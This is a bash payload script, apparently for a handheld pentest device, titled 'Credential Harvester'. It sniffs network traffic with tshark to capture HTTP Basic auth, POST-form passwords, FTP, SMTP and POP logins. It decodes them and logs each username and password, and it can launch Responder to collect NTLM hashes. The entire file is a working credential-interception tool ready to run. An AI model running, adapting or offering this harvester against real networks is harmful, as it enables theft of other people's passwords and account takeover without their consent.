#!/bin/bash
# Title: Credential Harvester
# Description: Extract credentials from network traffic and logs
# Author: Red Team Toolkit
# Version: 1.0
# Category: interception
# Net Mode: NAT
#
# LED States
# - Blue slow blink: Configuring
# - Cyan blink: Monitoring
# - Yellow flash: Credential found
# - Green: Complete
# - Red: Error

set -euo pipefail

ARTIFACTS_DIR="${ARTIFACTS_DIR:-/tmp/cred-harvester}"
MONITOR_DURATION="${MONITOR_DURATION:-300}"
CRED_LOG="$ARTIFACTS_DIR/credentials.log"

have() { command -v "$1" >/dev/null 2>&1; }

cleanup() {
  [[ -n "${MONITOR_PID:-}" ]] && kill "$MONITOR_PID" 2>/dev/null || true
  [[ -n "${RESPONDER_PID:-}" ]] && kill "$RESPONDER_PID" 2>/dev/null || true
  LED OFF
}
trap cleanup EXIT

log_cred() {
  local type="$1"
  local user="$2"
  local pass="$3"
  local source="$4"
  
  local timestamp
  timestamp=$(date '+%Y-%m-%d %H:%M:%S')
  
  {
    echo "=== Credential Captured ==="
    echo "Time: $timestamp"
    echo "Type: $type"
    echo "User: $user"
    echo "Pass: $pass"
    echo "Source: $source"
    echo ""
  } >> "$CRED_LOG"
  
  LOG yellow "CREDENTIAL: [$type] $user"
  LED Y DOUBLE
  VIBRATE
}

monitor_http_auth() {
  local iface="$1"
  local duration="$2"
  
  LOG "Monitoring HTTP Basic Auth..."
  
  if have tshark; then
    timeout "$duration" tshark -i "$iface" -Y 'http.authorization' \
      -T fields -e ip.src -e http.host -e http.authorization 2>/dev/null | \
    while read -r src host auth; do
      [[ -z "$auth" ]] && continue
      local decoded
      decoded=$(echo "$auth" | sed 's/Basic //' | base64 -d 2>/dev/null || echo "$auth")
      local user pass
      user=$(echo "$decoded" | cut -d: -f1)
      pass=$(echo "$decoded" | cut -d: -f2-)
      log_cred "HTTP-Basic" "$user" "$pass" "$host (from $src)"
    done &
    MONITOR_PID=$!
  fi
}

monitor_http_forms() {
  local iface="$1"
  local duration="$2"
  
  LOG "Monitoring HTTP form submissions..."
  
  if have tshark; then
    timeout "$duration" tshark -i "$iface" \
      -Y 'http.request.method == "POST" and (http.file_data contains "password" or http.file_data contains "pass" or http.file_data contains "pwd")' \
      -T fields -e ip.src -e http.host -e http.request.uri -e http.file_data 2>/dev/null | \
    while read -r src host uri data; do
      [[ -z "$data" ]] && continue
      LOG yellow "FORM POST: $host$uri"
      log_cred "HTTP-Form" "see-data" "$data" "$host$uri (from $src)"
    done &
    MONITOR_PID=$!
  fi
}

monitor_ftp() {
  local iface="$1"
  local duration="$2"
  
  LOG "Monitoring FTP credentials..."
  
  if have tshark; then
    local user="" pass="" host=""
    timeout "$duration" tshark -i "$iface" \
      -Y 'ftp.request.command == "USER" or ftp.request.command == "PASS"' \
      -T fields -e ip.dst -e ftp.request.command -e ftp.request.arg 2>/dev/null | \
    while read -r dst cmd arg; do
      if [[ "$cmd" == "USER" ]]; then
        user="$arg"
        host="$dst"
      elif [[ "$cmd" == "PASS" && -n "$user" ]]; then
        log_cred "FTP" "$user" "$arg" "$host"
        user=""
      fi
    done &
    MONITOR_PID=$!
  fi
}

monitor_telnet() {
  local iface="$1"
  local duration="$2"
  
  LOG "Monitoring Telnet sessions..."
  
  if have tshark; then
    timeout "$duration" tshark -i "$iface" -Y telnet -T fields -e telnet.data 2>/dev/null | \
    while read -r data; do
      [[ -z "$data" ]] && continue
      LOG "Telnet data: $data"
    done &
    MONITOR_PID=$!
  fi
}

monitor_smtp() {
  local iface="$1"
  local duration="$2"
  
  LOG "Monitoring SMTP authentication..."
  
  if have tshark; then
    timeout "$duration" tshark -i "$iface" \
      -Y 'smtp.auth.username or smtp.auth.password' \
      -T fields -e ip.dst -e smtp.auth.username -e smtp.auth.password 2>/dev/null | \
    while read -r dst user pass; do
      [[ -z "$user" && -z "$pass" ]] && continue
      log_cred "SMTP" "${user:-unknown}" "${pass:-captured}" "$dst"
    done &
    MONITOR_PID=$!
  fi
}

run_responder() {
  local iface="$1"
  
  if ! have responder; then
    LOG red "Responder not installed"
    return 1
  fi
  
  LOG "Starting Responder for hash capture..."
  
  local resp_log="$ARTIFACTS_DIR/responder"
  mkdir -p "$resp_log"
  
  responder -I "$iface" -w -F -P -v 2>&1 | tee "$resp_log/responder.log" &
  RESPONDER_PID=$!
  
  LOG "Responder running (PID: $RESPONDER_PID)"
  LOG "Hashes will be saved to: $resp_log"
}

parse_responder_logs() {
  LOG blue "=== Responder Results ==="
  
  local hash_files
  hash_files=$(find /usr/share/responder/logs -name "*.txt" 2>/dev/null || find "$ARTIFACTS_DIR" -name "*NTLM*" 2>/dev/null)
  
  if [[ -n "$hash_files" ]]; then
    for f in $hash_files; do
      LOG "Hash file: $f"
      head -5 "$f"
    done
  else
    LOG "No hashes captured"
  fi
}

monitor_all() {
  local iface="$1"
  local duration="$2"
  
  LOG blue "=== Full Credential Monitoring ==="
  LOG "Interface: $iface"
  LOG "Duration: ${duration}s"
  LOG ""
  
  local end_time=$(($(date +%s) + duration))
  
  if have tshark; then
    timeout "$duration" tshark -i "$iface" \
      -Y 'http.authorization or ftp.request.command == "USER" or ftp.request.command == "PASS" or smtp.auth.password or pop.request.command == "USER" or pop.request.command == "PASS"' \
      -T fields -e frame.time -e ip.src -e ip.dst -e _ws.col.Protocol -e _ws.col.Info 2>/dev/null | \
    while read -r time src dst proto info; do
      LOG "[$proto] $src -> $dst: $info"
      
      if [[ "$info" == *"Authorization"* || "$info" == *"USER"* || "$info" == *"PASS"* ]]; then
        LED Y DOUBLE
        VIBRATE
      fi
    done &
    MONITOR_PID=$!
    
    while kill -0 "$MONITOR_PID" 2>/dev/null; do
      local remaining=$((end_time - $(date +%s)))
      [[ $remaining -le 0 ]] && break
      LOG "Monitoring... ${remaining}s remaining"
      sleep 10
    done
    
    wait "$MONITOR_PID" 2>/dev/null || true
  fi
}

show_results() {
  LOG ""
  LOG blue "=== Harvested Credentials ==="
  
  if [[ -f "$CRED_LOG" ]]; then
    local count
    count=$(grep -c "Credential Captured" "$CRED_LOG" 2>/dev/null || echo "0")
    LOG "Total captured: $count"
    LOG ""
    cat "$CRED_LOG"
  else
    LOG "No credentials captured"
  fi
}

main() {
  LOG blue "=== Credential Harvester ==="
  LOG "Extract credentials from network traffic"
  LOG ""
  
  mkdir -p "$ARTIFACTS_DIR"
  : > "$CRED_LOG"
  
  LED B SLOW
  
  if ! have tshark && ! have tcpdump; then
    ERROR_DIALOG "No packet capture tools available"
    exit 1
  fi
  
  LOG "Mode:"
  LOG "1. Monitor all protocols"
  LOG "2. HTTP authentication only"
  LOG "3. HTTP forms (POST data)"
  LOG "4. FTP credentials"
  LOG "5. SMTP authentication"
  LOG "6. Run Responder (hash capture)"
  LOG ""
  
  local mode
  mode=$(NUMBER_PICKER "Mode (1-6)" 1) || true
  case $? in
    "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR")
      LOG "Cancelled"; exit 1 ;;
  esac
  
  local iface duration
  iface=$(TEXT_PICKER "Interface" "wlan0") || true
  [[ -z "$iface" ]] && { LOG "Cancelled"; exit 1; }
  
  duration=$(NUMBER_PICKER "Duration (seconds)" "$MONITOR_DURATION") || true
  [[ -z "$duration" ]] && duration="$MONITOR_DURATION"
  
  LED C SLOW
  LOG ""
  
  case "$mode" in
    1) monitor_all "$iface" "$duration" ;;
    2) monitor_http_auth "$iface" "$duration"; sleep "$duration" ;;
    3) monitor_http_forms "$iface" "$duration"; sleep "$duration" ;;
    4) monitor_ftp "$iface" "$duration"; sleep "$duration" ;;
    5) monitor_smtp "$iface" "$duration"; sleep "$duration" ;;
    6)
      run_responder "$iface"
      LOG "Press button to stop Responder"
      WAIT_FOR_BUTTON_PRESS
      kill "$RESPONDER_PID" 2>/dev/null || true
      parse_responder_logs
      ;;
  esac
  
  LED G SOLID
  
  show_results
  
  local cred_count
  cred_count=$(grep -c "Credential Captured" "$CRED_LOG" 2>/dev/null || echo "0")
  
  if [[ "$cred_count" -gt 0 ]]; then
    ALERT "Captured $cred_count credentials!"
    VIBRATE
  fi
  
  LOG ""
  LOG "Credentials saved to: $CRED_LOG"
  
  PROMPT "Press button to exit"
}

main "$@"
